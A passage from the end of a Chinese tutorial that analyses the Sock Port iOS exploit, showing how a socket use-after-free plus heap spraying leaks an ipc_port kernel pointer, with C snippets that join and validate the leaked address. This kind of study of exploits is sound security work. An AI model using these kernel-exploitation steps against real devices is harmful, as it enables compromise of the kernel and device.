    int	ip6po_prefer_tempaddr; // + 184
    int ip6po_flags;
};
```

`minmtu` 和 `ip6po_prefer_tempaddr` 分别位于该结构体的 +180 和 +184 区域，由于每个 pointer 是 8B，最近的 pointer 位于 +176 ~ +184 和 +184 ~ + 192 区域，因此通过 `minmtu` 我们能读到前一个 pointer 的高 32 位，通过 `ip6po_prefer_tempaddr` 能读到下一个指针的低 32 位，又因为 Heap Spraying 成功后这些 pointer 都是指向 target ipc_port 的，所以我们可以用他们拼接出一个完整的 pointer address，拼接方法是将 `minmtu` 左移 32 位或上 `ip6po_prefer_tempaddr`：
```c
uint64_t ptr = (((uint64_t)mtu << 32) & 0xffffffff00000000) | ((uint64_t)pref & 0x00000000ffffffff);
```

## 判断是否是内核对象指针的地址
下面最关键的步骤是如何判断这是一个有效地内核地址，这里需要两个基础知识：
1. 如果内存中的内容是 0xdeadbeef，则说明这块区域尚未完成初始化[3]；
2. 根据 XNU 中 `mach/arm/vm_param.h` 中的定义，内核地址的有效范围是从 0xffffffe000000000 ~ 0xfffffff3ffffffff，一般而言 port address 的高 32 位是 0xffffffe。

综合以上两点有以下判断代码：
```c
if (mtu >= 0xffffff00 && mtu != 0xffffffff && pref != 0xdeadbeef) {
    mach_port_destroy(mach_task_self(), p);
    close(sock);
    return ptr;
}
```

如果满足条件，此时我们已经拿到了 port address。

# 总结
本文先介绍了 Mach port 的用户空间与内核空间表示及其功能；随后简单介绍了 Sock Port 的实现机理；接着以漏洞的第一个关键点（通过 OOL Message 泄露 Port Addr）为切入点，结合 XNU 源码深入分析了 OOL Message 实现 ipc_port pointers Spraying 的原理；最后结合 Sock Port 源码分析了拿到 Port Address 的过程。

通过这一节的学习，相信你对 Mach port 的整套机制和 Heap Spraying 有了更加深入的认识。

# 下节预告
通过 Socket UAF 不仅能实现泄露 Port Address，还能实现任意地址的读取和任意内核 zone 的释放。在下一节中，我们将介绍基于 IOSurface 的 Heap Spraying 与 Socket UAF 组合来实现上述 Primitives 的原理和过程。

<img style="width: 320px;" src="https://user-gold-cdn.xitu.io/2019/8/24/16cc33a51b0a7319?w=1005&h=1164&f=png&s=197292"></img>

# 参考资料
1. [Debugging Mach Ports. Robert Sesek](https://robert.sesek.com/2012/1/debugging_mach_ports.html)
2. [Mach Overview - Tasks and Threads. Apple](https://developer.apple.com/library/archive/documentation/Darwin/Conceptual/KernelProgramming/Mach/Mach.html)
3. [Hexspeak. Wikipedia](https://en.wikipedia.org/wiki/Hexspeak)
4. [GNU Doc - Memory](https://www.gnu.org/software/hurd/gnumach-doc/Memory.html)
5. [IPC Voucher UaF Remote Jailbreak Stage 2. Qixun Zhao](https://paper.seebug.org/800/)
6. [Sock Port 2 on GitHub](https://github.com/jakeajames/sock_port)
7. [CVE-2016-7637---再谈Mach IPC. turing.huang](https://turingh.github.io/2017/01/10/CVE-2016-7637-%E5%86%8D%E8%B0%88Mach-IPC/)